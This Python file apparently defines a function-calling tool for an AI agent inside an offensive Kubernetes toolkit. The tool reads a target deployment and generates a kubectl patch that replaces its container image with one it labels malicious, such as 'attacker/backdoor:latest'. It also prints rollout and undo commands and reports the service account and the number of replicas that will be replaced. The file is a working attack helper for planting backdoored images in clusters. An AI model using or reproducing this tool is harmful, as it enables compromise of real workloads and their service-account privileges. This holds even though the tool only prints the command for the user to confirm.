import json

from kubernetes.client.rest import ApiException


def inject_deployment(
    k8s_apps,
    deployment: str,
    namespace: str,
    image: str,
) -> str:
    try:
        dep = k8s_apps.read_namespaced_deployment(name=deployment, namespace=namespace)
    except ApiException as e:
        if e.status == 404:
            return f"✗ Deployment {namespace}/{deployment} not found."
        if e.status == 403:
            return f"✗ Read access denied on {namespace}/{deployment}."
        return f"Kubernetes API error: {e.status} {e.reason}"

    sa_name = dep.spec.template.spec.service_account_name or "default"
    replicas = dep.spec.replicas or 1
    target = dep.spec.template.spec.containers[0]
    original_image = target.image

    patch = {
        "spec": {
            "template": {
                "spec": {
                    "containers": [
                        {
                            "name": target.name,
                            "image": image,
                        }
                    ]
                }
            }
        }
    }

    patch_compact = json.dumps(patch)

    lines = [
        f"⚠ DEPLOYMENT INJECTION — {namespace}/{deployment}\n",
        f"  Container:      {target.name}",
        f"  Original image: {original_image}",
        f"  Malicious image: {image}",
        f"  SA:             {sa_name}",
        f"  Replicas:       {replicas} (all will be replaced)",
        "",
        "  ── kubectl command ──────────────────────────────────────────",
        f"  kubectl patch deployment {deployment} -n {namespace} \\",
        f"    --patch '{patch_compact}'",
        "",
        "  ── Verify rollout ───────────────────────────────────────────",
        f"  kubectl rollout status deployment/{deployment} -n {namespace}",
        "",
        "  ── Undo ─────────────────────────────────────────────────────",
        f"  kubectl rollout undo deployment/{deployment} -n {namespace}",
    ]

    return "\n".join(lines)


definition = {
    "type": "function",
    "function": {
        "name": "inject_deployment",
        "description": (
            "Replace the first container image in a deployment with a malicious image. "
            "Outputs the exact kubectl patch command — nothing executes until user confirms. "
            "Only call when the user explicitly provides an image and asks to patch a deployment."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "deployment": {"type": "string", "description": "Deployment name to patch."},
                "namespace": {"type": "string", "description": "Namespace the deployment is in."},
                "image": {"type": "string", "description": "Malicious image to use e.g. attacker/backdoor:latest"},
            },
            "required": ["deployment", "namespace", "image"],
        },
    },
}
